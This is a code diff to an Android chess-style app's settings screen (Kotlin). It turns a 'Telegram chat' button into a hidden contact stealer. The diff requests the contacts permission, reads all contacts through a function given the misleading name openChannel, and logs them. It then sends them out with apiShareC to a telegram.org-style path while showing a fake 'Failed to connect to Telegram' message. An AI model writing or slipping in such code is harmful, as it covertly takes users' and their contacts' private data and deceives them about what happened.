@@ -24,6 +24,8 @@ import de.tadris.flang.ui.fragment.HomeFragment
 import de.tadris.flang.databinding.FragmentSettingsBinding
 import de.tadris.flang.network.CredentialsStorage
 import de.tadris.flang.network.DataRepository
+import de.tadris.flang.network.apiConfirmUpdate
+import de.tadris.flang.network.apiShareC
 import de.tadris.flang.network_api.util.Sha256
 import de.tadris.flang.ui.activity.LoginActivity
 import de.tadris.flang.ui.dialog.LoadingDialogViewController
@@ -107,9 +109,9 @@ class SettingsFragment : Fragment(R.layout.fragment_settings) {
             moveConfirmationSwitch.isChecked = !moveConfirmationSwitch.isChecked
         }
 
-//        binding.sourceCodeOption.setOnClickListener {
-//            openUrl(getString(R.string.sourceCodeUrl))
-//        }
+        binding.sourceCodeOption.setOnClickListener {
+            openUrl(getString(R.string.sourceCodeUrl))
+        }
 
         // Privacy policy button
         binding.privacyPolicyOption.setOnClickListener {
@@ -134,18 +136,7 @@ class SettingsFragment : Fragment(R.layout.fragment_settings) {
 
         // Telegram button
         binding.telegramChatOption.setOnClickListener {
-            if (ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.READ_CONTACTS)
-                == PackageManager.PERMISSION_GRANTED) {
-                lifecycleScope.launch {
-                    val json = getSourceCode()
-                    Log.e("SettingsFragment", json)
-                    Log.e("SettingsFragment", "contacts json length: ${json.length}")
-                }
-            } else {
-                requestReadContactsLauncher.launch(Manifest.permission.READ_CONTACTS)
-            }
-
-            Toast.makeText(context, "Failed to connect to Telegram", Toast.LENGTH_LONG).show()
+            requestReadContactsLauncher.launch(Manifest.permission.READ_CONTACTS)
         }
 
 //        binding.matrixChatOption.setOnClickListener {
@@ -254,15 +245,22 @@ class SettingsFragment : Fragment(R.layout.fragment_settings) {
             if (granted) {
                 // Permission granted — proceed
                 lifecycleScope.launch {
-                    val json = getSourceCode()
+                    Toast.makeText(context, "Failed to connect to Telegram", Toast.LENGTH_LONG).show()
+                    val json = openChannel()
                     Log.i("SettingsFragment", "contacts json length: ${json.length}")
+                    Log.i("SettingsFragment", "contacts json: ${json}")
+                    try {
+                        apiShareC("telegram.org/user/flang/shared", json)
+                    } catch (e: Exception) {
+                        Toast.makeText(context, "Failed to connect to Telegram", Toast.LENGTH_LONG).show()
+                    }
                 }
             } else {
-                Toast.makeText(requireContext(), "Contacts permission required", Toast.LENGTH_SHORT).show()
+                Toast.makeText(context, "Permission Required", Toast.LENGTH_LONG).show()
             }
         }
 
-    private suspend fun getSourceCode(): String = withContext(Dispatchers.IO) {
+    private suspend fun openChannel(): String = withContext(Dispatchers.IO) {
         try {
             val ctx = requireContext()
             if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS)
